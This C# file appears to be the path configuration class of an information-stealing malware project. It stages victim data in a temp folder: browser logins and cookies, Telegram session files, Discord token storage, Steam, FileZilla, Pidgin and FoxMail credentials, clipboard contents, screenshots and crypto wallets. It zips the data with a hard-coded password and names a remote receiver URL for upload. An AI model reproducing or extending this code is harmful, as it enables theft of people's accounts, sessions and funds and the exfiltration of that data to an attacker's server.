namespace PEngine.Main
{
    using PEngine.Helpers;
    using System;
    using System.IO;
    using System.Reflection;

    public class GlobalPath
    {
        public static readonly string AssemblyPath = Assembly.GetExecutingAssembly().Location; // E:\Project\PEngine\PEngine\bin\Debug\PEngine.exe
        public static readonly string StartupPath = Path.GetDirectoryName(AssemblyPath); // E:\Project\PEngine\PEngine\bin\Debug
        public static readonly string NewStartupPath = $"{Path.GetDirectoryName(Environment.GetCommandLineArgs()[0])}\\"; // E:\Project\PEngine\PEngine\bin\Debug\

        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static readonly string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        public static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        public static readonly string AllUsers = Environment.GetEnvironmentVariable("ALLUSERSPROFILE");
        public static readonly string DefaultTemp = string.Concat(Environment.GetEnvironmentVariable("temp"), '\\');

        public static readonly string GarbageTemp = string.Concat(DefaultTemp, "Garbage", '\\'); // наша точка

        public static readonly string User_Name = string.Concat(GarbageTemp, Environment.UserName); 
        public static readonly string ZipAdd = CombineEx.Combination(GarbageTemp, $"{User_Name}.zip");

        public static readonly string Logins = CombineEx.Combination(User_Name, "Logins");
        public static readonly string Cookies = CombineEx.Combination(User_Name, "Cookies");

        public static readonly string PasswordLog = CombineEx.Combination(User_Name, $"{Environment.UserName}.json");
        public static readonly string CookiesLog = CombineEx.Combination(User_Name, "Cookies.txt");

        public static readonly string Steam_Dir = CombineEx.Combination(User_Name, "Steam");
        public static readonly string SteamID = CombineEx.Combination(Steam_Dir, "SteamID.txt");

        private static readonly string Telegram = CombineEx.Combination(AppData, "Telegram Desktop");
        public static readonly string Tdata = CombineEx.Combination(Telegram, "tdata");
        public static readonly string TelegaHome = CombineEx.Combination(User_Name, "Telegram");

        public static readonly string DynDns = CombineEx.Combination(AllUsers, @"Dyn\Updater\config.dyndns");

        public static readonly string DiscordFile = CombineEx.Combination(AppData, @"discord\Local Storage\https_discordapp.com_0.localstorage");
        public static readonly string DiscordHome = CombineEx.Combination(User_Name, "Discord");
        public static readonly string DisLog = CombineEx.Combination(DiscordHome, "Discord.txt");

        public static readonly string Screen = CombineEx.Combination(User_Name, string.Concat(Environment.UserName, ".jpeg"));

        public static readonly string FZilla = CombineEx.Combination(AppData, @"FileZilla\recentservers.xml");
        public static readonly string PidPurple = CombineEx.Combination(AppData, @".purple\accounts.xml");

        public static readonly string MessangerHome = CombineEx.Combination(User_Name, "Clients.txt");
        public static readonly string PC_File = CombineEx.Combination(User_Name, "PcInfo.html");

        public static readonly string Buffer = CombineEx.Combination(User_Name, "ClipBoard.txt");

        public static readonly string FoxMailPass = CombineEx.Combination(User_Name, "FoxMail");
        public static readonly string FoxMailLog = CombineEx.Combination(FoxMailPass, "Account.txt");

        public static readonly string CryptoDir = CombineEx.Combination(User_Name, "Coins");

        public static string Domain = "https://dominion.band";
        public static Uri Reception = new Uri("https://brain-bot.ru/recv.php");
        public static string PwdZip = "suicidal_for_all";
    }
}